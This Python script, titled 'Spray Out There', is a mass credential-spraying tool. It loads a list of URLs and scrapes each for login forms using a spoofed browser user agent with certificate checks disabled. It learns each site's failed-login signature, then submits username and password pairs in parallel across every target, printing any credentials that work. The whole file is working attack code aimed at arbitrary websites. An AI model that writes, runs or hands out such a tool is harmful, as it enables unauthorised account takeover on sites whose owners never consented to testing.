#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
import requests
import urllib3
import concurrent.futures
from time import sleep
from urllib.parse import urljoin
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import json


class LoginForm(object):

    HTTP_TIMEOUT = 15
    HTTP_UA = { 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0" }
    #HTTP_UA = { 'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" }
    LOGIN_PAGES = ['login','signin','admin','panel','index.php']
    USER_FIELDS = ['user','email','usuario']
    LOGIN_FAIL = ['invalid login','authentication failed','password incorrect','error!','incorrect','invalid','failed']

    def __init__(self, url: str, auto=True):
        self.url = url.strip()
        if not (self.url and self.url.startswith('http')):
            raise ValueError('Invalid url')
        self.login_found = False
        self.login_url = None
        self.iuser = None
        self.ipass = None
        self.others = {}
        if auto:
            self.__findLogin()

    def __eq__(self, value):
        return (
            self.login_url == value.login_url and
            self.iuser == value.iuser and
            self.ipass == value.ipass
        )

    @staticmethod
    def TryLoginForm(url: str):
        login = LoginForm(url, True)
        return login if login.login_found else None

    def __findLogin(self) -> None:
        try:
            r = requests.get(self.url, timeout=LoginForm.HTTP_TIMEOUT, verify=False, headers=LoginForm.HTTP_UA)
        except:
            return False
        if r.status_code != 200 or 'text/html' not in r.headers['Content-Type']:
            return False

        soup = BeautifulSoup(r.text, 'html.parser')

        for form in soup.find_all('form'):
            inputs = form.find_all('input')
            buttons = form.find_all('button')
            self.login_url = urljoin(self.url, form.get('action'))

            user_field = [x.get('name') for x in inputs if x.get('name') and any(u in x.get('name').lower() for u in LoginForm.USER_FIELDS)]
            pass_field = [x.get('name') for x in inputs if x.get('type') == 'password']
            other_fields =  {
                **dict((x.get('name'), x.get('value')) for x in inputs if x.get('name')),
                **dict((x.get('name'), x.get('value')) for x in buttons if x.get('name'))
                }
            for k,v in other_fields.items():
                if not v:
                    other_fields[k] = ''

            if len(pass_field) == 1:
                self.ipass = pass_field[0]
                del other_fields[pass_field[0]]
                if user_field:
                    self.iuser = user_field[0]
                    del other_fields[user_field[0]]

                self.login_found = True
                self.others = other_fields
                break

    def FindBadLogin(self) -> list:
        self.bad_logins = []
        headers = {
            'Referer': self.url,
            **LoginForm.HTTP_UA
        }
        bad_login = {
            self.iuser: 'foo@n0n3.net',
            self.ipass: 'notavalidpass',
            **self.others
        }

        r_get = requests.get(self.login_url, timeout=LoginForm.HTTP_TIMEOUT, verify=False, headers=headers)
        r_post = requests.post(self.login_url, timeout=LoginForm.HTTP_TIMEOUT, verify=False, headers=headers, data=bad_login)
        content = r_get.text.lower()
        content_bad = r_post.text.lower()

        if r_get.status_code == 200 and r_post.status_code in [401, 402, 403]:
            self.bad_logins.append(
                {
                    'by':'status_code',
                    'value': r_post.status_code
                })

        for keyword in LoginForm.LOGIN_FAIL:
            if keyword in content_bad and keyword not in content:
                self.bad_logins.append(
                    {
                        'by':'keyword',
                        'value': keyword
                    })

        if len(content) != len(content_bad) and len(content_bad) != 0:
            bad_login[self.iuser] = 'bar'
            r_post_2 = requests.post(self.login_url, timeout=LoginForm.HTTP_TIMEOUT, verify=False, headers=headers, data=bad_login)
            if len(content_bad) == len(r_post_2.text.lower()):
                self.bad_logins.append(
                    {
                        'by':'size',
                        'value': len(content_bad)
                    })

        return self.bad_logins


class Brute(object):

    HTTP_TIMEOUT = 4
    HTTP_MAX_RETRIES = 3
    HTTP_UA = { 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0" }

    def __init__(self, users: list, passwords: list, login):
        if not (users and passwords):
            raise ValueError('Empty user or password list')
        if not (login.login_found and login.bad_logins):
            raise ValueError('Invalid Login')
        self.user_list = users
        self.pass_list = passwords
        self.ref_url = login.url
        self.login_url = login.login_url
        self.headers = {
            'Referer': self.ref_url,
            **Brute.HTTP_UA
        }
        self.iuser = login.iuser
        self.ipass = login.ipass
        self.others = login.others
        self.__select_best_bad(login.bad_logins)

    def __select_best_bad(self, bad_logins: list) -> None:
        self.bad_by = None
        self.bad_value = ''
        for option in bad_logins:
            if option['by'] == 'status_code':
                self.bad_by = 'status_code'
                self.bad_value = option['value']
                break
            if option['by'] == 'keyword':
                if self.bad_by == 'keyword':
                    if len(option['value']) > len(self.bad_value):
                        self.bad_value = option['value']
                else:
                    self.bad_by = 'keyword'
                    self.bad_value = option['value']
            if option['by'] == 'size':
                if not self.bad_by:
                    self.bad_by = 'size'
                    self.bad_value = option['value']

    def StartBrute(self, threads=8) -> bool:
        workers = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            for password in self.pass_list:
                for username in self.user_list:
                    w = pool.submit(self.CheckCreds, username, password)
                    workers.append(w)
            for worker in concurrent.futures.as_completed(workers):
                if worker.result():
                    print('[!] CREDS FOUND --', self.login_url, '-', self.creds) # Debug
                    pool.shutdown(wait=True)
                    return True
        return False

    def CheckCreds(self, username: str, password: str) -> bool:
        response = self.__do_attempt(username, password)
        if not response:
            return False
        if self.bad_by == 'keyword':
            if self.__by_keyword(response):
                self.creds = (username, password)
                return True
        elif self.bad_by == 'size':
            if self.__by_size(response):
                self.creds = (username, password)
                return True
        elif self.bad_by == 'status_code':
            if self.__by_status_code(response):
                self.creds = (username, password)
                return True
        return False

    def __do_attempt(self, username: str, password: str):
        attempt = 0
        payload = {
            self.iuser: username,
            self.ipass: password,
            **self.others
        }
        while(attempt < Brute.HTTP_MAX_RETRIES):
            try:
                return requests.post(self.login_url, timeout=Brute.HTTP_TIMEOUT, verify=False, headers=self.headers, data=payload)
            except requests.exceptions.ConnectionError:
                attempt += 2
            except requests.exceptions.HTTPError:
                attempt += 1
                sleep(attempt)
            except requests.exceptions.Timeout:
                attempt += 1
                sleep(attempt * 2)
            except requests.exceptions.TooManyRedirects:
                return False
            except requests.exceptions.RequestException:
                return False
        return False

    def __by_status_code(self, response) -> bool:
        return response.status_code != self.bad_value

    def __by_size(self, response) -> bool:
        return len(response.text) != self.bad_value

    def __by_keyword(self, response) -> bool:
        return self.bad_value not in response.text.lower()


def LoadUrls(file: str, filter=True) -> list:
    with open(file, 'r') as f:
        lines = f.read().splitlines()

    urls = list(set([x.strip() for x in lines if x.strip().startswith('http')]))
    if not filter:
        return urls

    filtered_urls = []
    for u in urls:
        path = urlparse(u).path
        resource = path.strip('/').split('/')[-1].lower()
        if any([resource.startswith(x) for x in LOGIN_PAGES]):
            filtered_urls.append(u.strip())
    return filtered_urls


if __name__ == "__main__":
    print('\n  --  Spray Out There  --  \n')
    logins = []

    targets = LoadUrls('urls.txt', False)
    print('> %s targets' % len(targets))

    print('> Searching login forms...')
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        workers = [pool.submit(LoginForm.TryLoginForm, url) for url in targets]
    concurrent.futures.wait(workers)

    for w in workers:
        r = w.result()
        if r and r not in logins:
            logins.append(r)
    print('> %s login forms found' % len(logins))

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        workers = [pool.submit(login.FindBadLogin) for login in logins]
    concurrent.futures.wait(workers)

    #print(json.dumps(vars(x) for x in logins, sort_keys=True, indent=4))
    print(json.dumps([vars(l) for l in logins if l.bad_logins], sort_keys=True, indent=4))

    users = ['admin']
    pazzes = ['admin']

    brutes = [Brute(users, pazzes, login) for login in logins if login.bad_logins]
    print('> Bruteforcing %s logins ...' % len(brutes))
    #for brute in brutes:
    #    brute.StartBrute()
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        workers = [pool.submit(brute.StartBrute) for brute in brutes]
    concurrent.futures.wait(workers)


